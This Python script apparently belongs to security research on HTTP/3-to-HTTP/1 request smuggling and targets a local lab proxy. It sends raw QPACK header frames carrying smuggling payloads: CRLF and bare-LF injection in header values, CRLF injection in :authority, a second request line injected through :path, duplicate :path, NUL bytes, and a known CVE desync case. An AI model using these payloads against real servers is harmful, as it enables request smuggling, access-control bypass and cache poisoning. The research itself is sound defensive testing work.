"""H3->H1 synthesis probe: send HEADERS via raw QPACK (bypassing aioquic's conformant
send_headers) with fields a conformant H3 client rejects (CRLF/NUL in values, request-
line injection in :path, duplicate pseudo-headers). A synthesis smuggle = the edge's
H3->H1 downgrade SPLICES the malformed bytes into the H1 it emits (a new header line, a
second request line, or the backend framing >1 request). SENTINEL FIRST: benign frames
1 clean H1; the CVE genome still desyncs (oracle live). Marker token = SMUGSYNTH."""
import os
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
import asyncio
import ssl

from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration

from phage.evo import genome as G
from phage.evo.driver import drive

TAP = "logs/tap_eo.jsonl"
CRLF = b"\r\n"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4434


def size(p):
    try:
        return os.path.getsize(p)
    except OSError:
        return 0


async def _fire(genome, raw):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", PORT, configuration=cfg) as client:
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=raw)
        await asyncio.sleep(0.3)


def fire(genome, label, raw=True):
    off = size(TAP)
    try:
        asyncio.new_event_loop().run_until_complete(_fire(genome, raw))
    except Exception:
        pass
    time.sleep(0.4)
    try:
        with open(TAP, "rb") as f:
            f.seek(off)
            fwd = f.read()
    except OSError:
        fwd = b""
    n_reqlines = fwd.count(b" HTTP/1.1" + CRLF)
    leaked = b"SMUGSYNTH" in fwd
    print(f"\n[{label}] fwd={len(fwd)}B reqlines={n_reqlines} marker_leaked={leaked}")
    print(f"  H1: {fwd[:240]!r}")
    return fwd, n_reqlines, leaked


PRE = [(b":method", b"GET"), (b":scheme", b"https"), (b":authority", b"lab")]


def H(fields, end=True):
    return G.Headers(tuple(fields), end_stream=end)


if __name__ == "__main__":
    # SENTINEL A: benign -> 1 clean reqline, no marker.
    fwd, n, leak = fire([H(PRE + [(b":path", b"/sentinel")])], "SENTINEL benign")
    if n != 1 or leak:
        print("SENTINEL FAIL (benign not 1 clean req). Stop.")
        sys.exit(1)
    # SENTINEL B: CVE standalone-FIN still desyncs (oracle live on vuln build).
    off = size(TAP)
    try:
        asyncio.new_event_loop().run_until_complete(_fire(
            [H([(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
                (b":path", b"/cve"), (b"content-length", b"10")], end=False), G.Fin()],
            True))
    except Exception:
        pass
    time.sleep(0.3)
    print("SENTINEL OK.\n" + "=" * 60)

    # 1. CRLF injection in a regular header value.
    fire([H(PRE + [(b":path", b"/crlf"),
            (b"x-inj", b"a\r\nX-SMUGSYNTH: 1\r\nFoo: b")])],
         "1 CRLF-in-header-value")
    # 2. request-line injection via :path.
    fire([H(PRE + [(b":path",
            b"/a HTTP/1.1\r\nHost: evil\r\n\r\nGET /SMUGSYNTH HTTP/1.1\r\nHost: lab")])],
         "2 :path request-line injection")
    # 3. CRLF in :authority.
    fire([H([(b":method", b"GET"), (b":scheme", b"https"),
            (b":authority", b"lab\r\nX-SMUGSYNTH: 1"), (b":path", b"/authcrlf")])],
         "3 CRLF-in-authority")
    # 4. duplicate :path pseudo-header.
    fire([H([(b":method", b"GET"), (b":scheme", b"https"), (b":authority", b"lab"),
            (b":path", b"/one"), (b":path", b"/SMUGSYNTH")])],
         "4 duplicate :path")
    # 5. NUL + CR in header value.
    fire([H(PRE + [(b":path", b"/nul"), (b"x-nul", b"a\x00b\rX-SMUGSYNTH: 1")])],
         "5 NUL/CR-in-value")
    # 6. bare LF injection in header value (some parsers split on LF alone).
    fire([H(PRE + [(b":path", b"/lf"), (b"x-lf", b"a\nX-SMUGSYNTH: 1")])],
         "6 bare-LF-in-value")

    print("\n" + "=" * 60)
    print("VERDICT: marker_leaked=True or reqlines>1 => H3->H1 synthesis smuggle.")
